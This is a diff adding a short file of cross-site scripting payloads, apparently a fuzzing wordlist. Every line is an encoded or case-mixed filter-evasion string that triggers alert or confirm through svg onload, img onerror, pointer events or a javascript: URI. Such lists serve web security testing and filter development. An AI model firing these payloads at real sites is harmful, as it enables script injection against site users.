@@ -1,0 +1,10 @@
+%3csvg%2fonload%3dalert%281%29
+\&#34;+confirm(1)+&#34; 
+"/><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
+"onx+%00+onpointerenter%3dalert(domain)+x"
+<!--<iMg sRc="--><img sRc=x oNerrOr=jAvascript:confirm()//">
+<img/src=x onError="`${x}`;alert(`Ex.Mi`);">
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+"><svg/onload=alert(document.domain)>"
+%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+javascript:alert()
